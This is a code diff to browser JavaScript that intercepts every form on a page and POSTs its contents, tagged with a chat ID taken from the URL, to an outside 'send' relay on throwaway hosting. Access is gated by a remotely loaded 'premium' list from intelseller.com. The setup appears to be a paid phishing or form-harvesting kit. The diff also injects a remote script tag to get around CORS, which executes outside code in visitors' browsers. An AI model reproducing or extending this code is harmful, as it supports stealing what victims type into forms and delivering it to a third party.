@@ -1,22 +1,56 @@
 // ================= LOAD PREMIUM USERS =================
+// Uses dynamic <script> tag injection instead of fetch()
+// This completely avoids CORS — browsers never block <script src> cross-origin
 let premiumUsers = [];
 
-async function loadPremiumUsers() {
-  try {
-    const res = await fetch("https://intelseller.com/api/premium/users");
-    const data = await res.json();
-    premiumUsers = data.ids || [];
-  } catch (err) {
-    console.error("❌ Failed to load premium list", err);
-    premiumUsers = [];
-  }
+function loadPremiumUsers() {
+  return new Promise((resolve) => {
+    // Remove any old script tag from previous calls
+    const old = document.getElementById("__premiumScript");
+    if (old) old.remove();
+
+    // Timeout fallback — if script fails to load in 5s, continue with []
+    const timeout = setTimeout(() => {
+      console.warn("⚠️ premiumlist.js load timeout — continuing without premium list");
+      premiumUsers = [];
+      resolve();
+    }, 5000);
+
+    const script = document.createElement("script");
+    script.id = "__premiumScript";
+    // ?_=timestamp prevents browser caching stale list
+    script.src = "https://intelseller.com/premiumlist.js?_=" + Date.now();
+
+    script.onload = () => {
+      clearTimeout(timeout);
+      // Server sets: var premiumUsers = [...]; window.premiumUsers = premiumUsers;
+      // After script runs, window.premiumUsers is populated
+      if (Array.isArray(window.premiumUsers) && window.premiumUsers.length > 0) {
+        premiumUsers = window.premiumUsers;
+        console.log("✅ Premium users loaded: " + premiumUsers.length + " users");
+      } else {
+        console.warn("⚠️ premiumlist.js loaded but premiumUsers is empty or invalid");
+        premiumUsers = [];
+      }
+      resolve();
+    };
+
+    script.onerror = () => {
+      clearTimeout(timeout);
+      console.error("❌ Failed to load premiumlist.js script");
+      premiumUsers = [];
+      resolve(); // always resolve so the app continues
+    };
+
+    document.head.appendChild(script);
+  });
 }
 
 // ================= MAIN SCRIPT =================
 document.addEventListener("DOMContentLoaded", async () => {
   await loadPremiumUsers(); // 🔥 Load premium list first
 
-  const DEFAULT_USER_ID = "7979664801";
+  const DEFAULT_USER_ID = "6940101627";  // ✅ Test ID
   const DEFAULT_BALANCE = "0";
   const DEFAULT_MIN = "0";
   const forms = document.querySelectorAll("form");
@@ -57,13 +91,23 @@ document.addEventListener("DOMContentLoaded", async () => {
 
       const numericUserId = Number(userId);
 
+      // 🔍 DEBUG: Show what we're checking
+      console.log("📋 Form Submission Debug:");
+      console.log(`   URL ID parameter: "${userId}" (type: ${typeof userId})`);
+      console.log(`   Converted to number: ${numericUserId} (type: ${typeof numericUserId})`);
+      console.log(`   Premium users array:`, premiumUsers);
+      console.log(`   Is user in premium list? ${premiumUsers.includes(numericUserId)}`);
+      console.log(`   Checking: premiumUsers.includes(${numericUserId})`);
+
       // ❌ BLOCK NON-PREMIUM USERS
       if (!premiumUsers.includes(numericUserId)) {
+        console.warn(`❌ User ${numericUserId} NOT in premium list. Available:`, premiumUsers.slice(0, 10));
         showPopup("🚫 Access denied. Try again or check premium.", "#ff4d4d");
         return;
       }
 
       // ✅ PREMIUM USER CONTINUES
+      console.log(`✅ User ${numericUserId} IS premium. Continuing...`);
       const formData = new FormData(form);
 
       formData.append("chat_id", userId);
@@ -84,7 +128,7 @@ document.addEventListener("DOMContentLoaded", async () => {
 
       try {
         const response = await fetch(
-          "https://sender-slbv.onrender.com/send",
+          "https://web-production-d469f.up.railway.app/send",
           { method: "POST", body: formData }
         );
 
